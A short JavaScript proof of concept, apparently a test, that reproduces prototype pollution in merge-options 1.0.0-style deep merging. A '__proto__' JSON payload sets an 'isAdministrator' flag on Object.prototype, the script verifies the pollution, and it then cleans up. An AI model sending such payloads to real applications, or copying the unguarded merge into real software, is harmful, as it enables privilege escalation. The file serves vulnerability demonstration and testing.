function clone(value) {
  if (value === null || typeof value !== "object") return value;
  const result = Array.isArray(value) ? [] : {};
  for (const key of Object.keys(value)) result[key] = clone(value[key]);
  return result;
}

function merge(merged, source) {
  for (const key of Object.keys(source)) {
    if (key in merged) {
      merged[key] = merge(merged[key], source[key]);
    } else {
      merged[key] = clone(source[key]);
    }
  }
  return merged;
}

function representative100MergeOptions(...options) {
  let merged = {};
  for (const option of options) merged = merge(merged, option);
  return merged;
}

const patch = JSON.parse('{"__proto__":{"isAdministrator":true}}');
try {
  representative100MergeOptions({}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("merge-options 1.0.0 semantics did not modify Object.prototype");
  }
  console.log("merge-options 1.0.0 semantics modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
